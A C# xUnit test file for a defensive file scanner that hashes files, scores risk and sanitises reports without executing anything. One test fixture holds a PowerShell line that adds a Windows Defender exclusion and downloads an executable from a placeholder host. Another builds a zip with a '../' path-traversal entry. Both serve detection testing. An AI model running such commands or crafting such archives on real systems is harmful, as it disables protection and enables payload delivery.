using System.IO.Compression;
using System.Security.Cryptography;
using System.Text.Json;
using Xunit;

namespace DestinyBlackBox.Tests;

public sealed class FileInspectorTests : IDisposable
{
    private readonly string root = Path.Combine(Path.GetTempPath(), $"PCBlackBox.Tests-{Guid.NewGuid():N}");

    public FileInspectorTests() => Directory.CreateDirectory(root);

    public void Dispose()
    {
        if (Directory.Exists(root))
            Directory.Delete(root, true);
    }

    [Theory]
    [InlineData(".EXE")]
    [InlineData(".ps1")]
    [InlineData(".LnK")]
    public void ActiveContentExtensionsAreCaseInsensitive(string extension)
        => Assert.True(FileInspector.IsActiveContentExtension(extension));

    [Fact]
    public async Task ScanOfTextFileProducesStableHashWithoutExecutingIt()
    {
        string path = Path.Combine(root, "notes.txt");
        await File.WriteAllTextAsync(path, "ordinary text");

        ScanResult result = await new FileInspector().ScanAsync(path, null, CancellationToken.None);

        FileAnalysis file = Assert.Single(result.Files);
        Assert.Equal("notes.txt", file.RelativePath);
        Assert.Equal("Text", file.FileType);
        Assert.Equal(Convert.ToHexString(SHA256.HashData(await File.ReadAllBytesAsync(path))), file.Sha256);
        Assert.Equal("CLEAR", result.RiskCode);
    }

    [Fact]
    public async Task ScriptCapabilitiesRaiseReviewPriority()
    {
        string path = Path.Combine(root, "admin.ps1");
        await File.WriteAllTextAsync(path, "Add-MpPreference -ExclusionPath C:\\Temp\nInvoke-WebRequest https://example.invalid/tool.exe");

        ScanResult result = await new FileInspector().ScanAsync(path, null, CancellationToken.None);

        FileAnalysis file = Assert.Single(result.Files);
        Assert.Contains(file.Indicators, indicator => indicator.Code == "defender-change");
        Assert.Contains(file.Indicators, indicator => indicator.Code == "remote-download");
        Assert.Equal("REVIEW", file.RiskCode);
        Assert.Equal(58, file.RiskScore);
    }

    [Fact]
    public async Task ArchiveTraversalAndActiveContentAreReportedWithoutExtraction()
    {
        string archivePath = Path.Combine(root, "sample.zip");
        using (ZipArchive archive = ZipFile.Open(archivePath, ZipArchiveMode.Create))
        {
            using StreamWriter writer = new(archive.CreateEntry("../escape.ps1").Open());
            writer.Write("Write-Output safe-test");
        }

        ScanResult result = await new FileInspector().ScanAsync(archivePath, null, CancellationToken.None);

        FileAnalysis file = Assert.Single(result.Files);
        Assert.Contains(file.Indicators, indicator => indicator.Code == "archive-traversal");
        Assert.Contains(file.Indicators, indicator => indicator.Code == "archive-active-content");
        Assert.False(File.Exists(Path.Combine(root, "escape.ps1")));
    }

    [Fact]
    public void RiskScoreIsClampedAndUsesDocumentedBands()
    {
        var file = new FileAnalysis();
        file.Indicators.Add(new Indicator("danger", "one", "ja", "en", 80));
        file.Indicators.Add(new Indicator("danger", "two", "ja", "en", 80));

        Assert.Equal(100, file.RiskScore);
        Assert.Equal("HIGH", file.RiskCode);

        var review = new FileAnalysis();
        review.Indicators.Add(new Indicator("watch", "review", "ja", "en", 25));
        Assert.Equal("REVIEW", review.RiskCode);

        var low = new FileAnalysis();
        low.Indicators.Add(new Indicator("info", "low", "ja", "en", 0));
        Assert.Equal("LOW", low.RiskCode);
    }

    [Fact]
    public void ReportsSanitizeTableContentAndOmitAbsolutePaths()
    {
        var result = new ScanResult
        {
            TargetPath = @"C:\\Users\\Private\\secret.ps1",
            TargetName = "secret.ps1",
            StartedAt = new DateTime(2026, 8, 6, 9, 0, 0),
            Duration = TimeSpan.FromSeconds(1)
        };
        result.Files.Add(new FileAnalysis
        {
            FullPath = result.TargetPath,
            RelativePath = "folder|name`\r\n.ps1",
            Size = 12,
            Sha256 = new string('A', 64),
            FileType = "Script / active text"
        });

        string markdown = ReportBuilder.Build(result, "en");
        string json = ReportBuilder.BuildJson(result, "en");

        Assert.DoesNotContain(result.TargetPath, markdown, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain(result.TargetPath, json, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("folder/name'\uFFFD\uFFFD.ps1", markdown);
        using JsonDocument document = JsonDocument.Parse(json);
        Assert.Equal("pc-black-box-report-v2", document.RootElement.GetProperty("schema").GetString());
        Assert.Equal("folder|name`\uFFFD\uFFFD.ps1", document.RootElement.GetProperty("files")[0].GetProperty("path").GetString());
    }

    [Fact]
    public async Task PreCanceledScanDoesNotReadTarget()
    {
        string path = Path.Combine(root, "cancel.txt");
        await File.WriteAllTextAsync(path, "not read");
        using var cancellation = new CancellationTokenSource();
        cancellation.Cancel();

        await Assert.ThrowsAnyAsync<OperationCanceledException>(
            () => new FileInspector().ScanAsync(path, null, cancellation.Token));
    }
}
